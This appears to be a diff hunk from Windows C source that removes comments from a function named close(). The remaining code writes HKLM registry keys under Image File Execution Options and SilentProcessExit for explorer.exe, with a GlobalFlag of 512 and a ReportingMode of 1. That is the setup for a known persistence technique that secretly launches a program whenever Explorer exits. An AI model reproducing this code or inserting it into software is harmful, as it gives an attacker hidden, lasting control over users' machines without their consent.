@@ -49,13 +49,8 @@ int close(const char* exe) {
   DWORD gF = 512;
   DWORD rM = 1;
 
-  // image file
   const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe";
-
-  // silent exit
   const char* silent = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\explorer.exe";
-
-
 
   LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
   if (res == ERROR_SUCCESS) {
